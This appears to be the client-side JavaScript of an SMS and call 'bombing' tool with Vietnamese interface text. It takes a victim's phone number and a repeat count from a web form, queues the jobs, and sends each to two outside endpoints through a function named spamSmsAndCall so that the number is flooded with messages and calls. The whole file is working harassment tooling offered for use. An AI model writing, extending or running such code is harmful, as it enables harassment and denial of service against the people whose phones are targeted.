let queue = [];
let processing = false;

// List of URLs
const urls = [
    'https://quang.nqtool.net/?',
    'https://quang.nqtool.net/index4.php?'
    // Add more URLs as needed
];

function addToQueue() {
    const phone = document.getElementById('phone').value;
    const times = document.getElementById('times').value;

    if (phone && times) {
        queue.push({ phone, times });
        updateStatusBar();
        if (!processing) {
            processQueue();
        }
    }
}

function processQueue() {
    if (queue.length === 0) {
        processing = false;
        return;
    }

    processing = true;
    const { phone, times } = queue.shift();

    const listItem = document.createElement('li');
    listItem.innerText = `Bắt Đầu ${phone} (${times} times)`;
    document.getElementById('status-list').appendChild(listItem);

    spamSmsAndCall(phone, times, listItem);
}

function spamSmsAndCall(phone, times, listItem) {
    // Create URLs for both API requests
    const url1 = `${urls[0]}phone=${phone}&amout=${times}`;
    const url2 = `${urls[1]}phone=${phone}&amout=${times}`;

    // Fetch both URLs simultaneously
    Promise.all([
        fetch(url1).then(response => response.json()),
        fetch(url2).then(response => response.json())
    ])
    .then(([response1, response2]) => {
        // Combine results from both URLs
        listItem.innerText = `Thành Công ${phone}: URL1 - ${response1.message}, URL2 - ${response2.message}`;
        processQueue();
    })
    .catch(error => {
        // Handle error case
        listItem.innerText = `Thất Bại ${phone}`;
        processQueue();
    });
}

function updateStatusBar() {
    const statusList = document.getElementById('status-list');
    statusList.innerHTML = ''; // Clear the list
    queue.forEach((item, index) => {
        const listItem = document.createElement('li');
        listItem.innerText = `Luồng: ${item.phone} (${item.times} times)`;
        statusList.appendChild(listItem);
    });
}
